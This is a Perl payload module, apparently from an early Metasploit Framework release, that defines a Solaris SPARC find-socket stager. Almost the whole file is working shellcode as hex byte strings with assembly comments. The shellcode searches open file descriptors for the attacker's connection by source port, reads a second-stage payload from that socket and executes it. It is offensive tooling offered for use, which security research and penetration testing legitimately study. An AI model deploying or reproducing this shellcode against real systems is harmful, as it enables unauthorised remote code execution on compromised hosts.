package Msf::PayloadComponent::SolarisFindStager;
use strict;
use Pex::SPARC;
use base 'Msf::PayloadComponent::SolarisPayload';
sub _Load {
  Msf::PayloadComponent::SolarisPayload->_Import('Msf::PayloadComponent::FindConnection');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
    'Authors'      => [ 'optyx <optyx [at] uberhax0r.net>', ],
    'Arch'         => [ 'sparc' ],
    'Priv'         => 0,
    'OS'           => [ 'solaris' ],
    'Multistage'   => 1,
    'Size'         => '',
};

sub SolarisPayload {
    my $self = shift;
    my $cport = $self->GetVar('CPORT');

    my $hash = {
        Payload =>
            Pex::SPARC::Set($cport ^ 4095, "l5").
#            "\x2b\x10\x50\x40".     # sethi        %hi(0x41410000), %l5
#            "\xab\x35\x60\x10".     # srl          %l5, 16, %l5
            "\xaa\x1d\x6f\xff".     # xor          %l5, 4095, %l5
            "\xae\x10\x24\x01".     # mov          1025, %l7
            "\x96\x10\x20\x10".     # mov          16, %o3
            "\xd6\x23\xbf\xe8".     # st           %o3, [%sp - 24]
            "\x94\x23\xa0\x18".     # sub          %sp, 24, %o2
            "\x92\x23\xa0\x14".     # sub          %sp, 20, %o1
            "\xae\x05\xff\xff".     # add          %l7, -1, %l7
            "\x90\x15\xc0\x17".     # or           %l7, %l7, %o0
            "\x82\x10\x20\xf3".     # mov          243, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\xde\x13\xbf\xee".     # lduh         [%sp - 18], %o7
            "\x9e\x9b\xc0\x15".     # xorcc        %o7, %l5, %o7
            "\x32\xbf\xff\xf6".     # bne,a        0x10368
            "\x90\x15\xc0\x17".     # or           %l7, %l7, %o0
            "\x95\x2d\xe0\x10".     # sll          %l7, 16, %o2
            "\x82\x10\x20\x03".     # mov          3, %g1
            "\x91\xd0\x20\x08".     # ta           0x8
            "\x9f\xc3\xbf\xe8".     # jmpl         %sp - 24, %o7
            "\xac\x1d\x80\x16",     # xor          %l6, %l6, %l6
    };
    
    return($hash);  
};

sub new {
    my $class = shift;
    my $hash = @_ ? shift : { };
    $hash = $class->MergeHashRec($hash, {'Info' => $info});
    my $self = $class->SUPER::new($hash, @_);
    return($self);
}

1;
